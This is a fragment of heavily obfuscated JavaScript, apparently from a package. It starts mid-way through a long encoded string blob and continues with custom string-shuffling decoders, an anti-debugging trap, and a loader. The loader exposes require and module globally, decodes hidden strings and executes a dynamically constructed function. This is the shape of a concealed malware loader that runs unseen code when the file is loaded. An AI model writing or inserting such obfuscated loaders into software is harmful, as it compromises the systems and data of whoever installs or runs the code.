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'];_0x5098=function(){return _0x3cb552;};return _0x5098();}function spin(_0x1a8260,_0x3448d1){var _0x3ebe0a=_0xe041;for(var _0x6e9d4c,_0x483a95,_0x468f54,_0x3d5783,_0x52d0ef,_0x2b155a,_0x4e7ed8=[],_0x5b54d8=0x0,_0x18b827=_0x3448d1[0x0];_0x5b54d8<_0x1a8260['length'];)_0x4e7ed8[_0x5b54d8]=_0x1a8260[_0x3ebe0a(0x17)](_0x5b54d8),_0x5b54d8+=0x1;for(_0x6e9d4c=_0x4e7ed8[_0x3ebe0a(0x0)],_0x5b54d8=0x0;_0x5b54d8<_0x6e9d4c;)_0x483a95=_0x18b827*(_0x5b54d8+_0x3448d1[0x1])+_0x18b827%_0x3448d1[0x2],_0x52d0ef=(_0x468f54=_0x18b827*(_0x5b54d8+_0x3448d1[0x3])+_0x18b827%_0x3448d1[0x4])%_0x6e9d4c,_0x2b155a=_0x4e7ed8[_0x3d5783=_0x483a95%_0x6e9d4c],_0x4e7ed8[_0x3d5783]=_0x4e7ed8[_0x52d0ef],_0x4e7ed8[_0x52d0ef]=_0x2b155a,_0x18b827=(_0x483a95+_0x468f54)%_0x3448d1[0x5],_0x5b54d8+=0x1;return _0x4e7ed8['join']('');}function splitLane(_0x18e365){var _0x214eb8=_0xe041,_0x7d11f0=String['fromCharCode'](0x1c),_0x432747=spin(_0x18e365,NX);return(_0x432747=(_0x432747=(_0x432747=_0x432747[_0x214eb8(0x9)]('^')[_0x214eb8(0x10)](_0x7d11f0))['split']('*1')[_0x214eb8(0x10)]('^'))['split']('*0')[_0x214eb8(0x10)]('*'))['split'](_0x7d11f0);}function peel(_0x3de695){return spin(_0x3de695,SX);}!function(_0x5877ad,_0x2e2079){var _0x21ced8=_0xe041,_0xe84a58={'lRaIg':'chain','wvKQl':_0x21ced8(0x2),'epkfv':_0x21ced8(0x20),'Ukunu':_0x21ced8(0x3)},_0x209bb8=(function(){var _0x34ab57=!![];return function(_0x43ced9,_0x4fae8c){var _0x3c0a6e=_0x34ab57?function(){var _0x393386=_0xe041;if(_0x4fae8c){var _0xd046d3=_0x4fae8c[_0x393386(0x1e)](_0x43ced9,arguments);return _0x4fae8c=null,_0xd046d3;}}:function(){};return _0x34ab57=![],_0x3c0a6e;};}());(function(){_0x209bb8(this,function(){var _0x3c7691=_0xe041,_0x2765c6=new RegExp(_0x3c7691(0x1f)),_0x4761da=new RegExp(_0x3c7691(0x16),'i'),_0x55f688=_0x490b11(_0x3c7691(0xc));!_0x2765c6['test'](_0x55f688+_0xe84a58[_0x3c7691(0x1)])||!_0x4761da[_0x3c7691(0x18)](_0x55f688+_0xe84a58[_0x3c7691(0xe)])?_0x55f688('0'):_0x490b11();})();}()),_0x5877ad['z']=z;var _0x1b38ff=splitLane(_0xe84a58[_0x21ced8(0x19)]);_0x5877ad[_0x1b38ff[0x0]]=_0x2e2079,typeof module===_0x1b38ff[0x1]&&(_0x5877ad[_0x1b38ff[0x2]]=module);var _0xa3935d=peel(_0xe84a58['Ukunu']),_0xa139a3=peel[_0xa3935d[_0x21ced8(0x21)](0x0,0xb)],_0x3c9d5f=_0xa139a3('',peel(_0x21ced8(0xf)));_0xa139a3('',_0x3c9d5f(peel(_0x21ced8(0x11))))(0x9cd);}(global,require);function _0x490b11(_0x3919ce){var _0x695c88=_0xe041,_0x14052e={'aKviz':_0x695c88(0x1b),'Rofgh':_0x695c88(0x15)};function _0x58dd58(_0x585b59){var _0x1e9ea4=_0x695c88;if(typeof _0x585b59===_0x1e9ea4(0xd))return function(_0x53d0ac){}[_0x1e9ea4(0x4)](_0x14052e['aKviz'])['apply'](_0x1e9ea4(0xb));else(''+_0x585b59/_0x585b59)[_0x1e9ea4(0x0)]!==0x1||_0x585b59%0x14===0x0?function(){return!![];}[_0x1e9ea4(0x4)](_0x1e9ea4(0x15)+'gger')[_0x1e9ea4(0x7)]('action'):function(){return![];}[_0x1e9ea4(0x4)](_0x14052e[_0x1e9ea4(0x23)]+'gger')[_0x1e9ea4(0x1e)](_0x1e9ea4(0x12));_0x58dd58(++_0x585b59);}try{if(_0x3919ce)return _0x58dd58;else _0x58dd58(0x0);}catch(_0x20eebc){}}
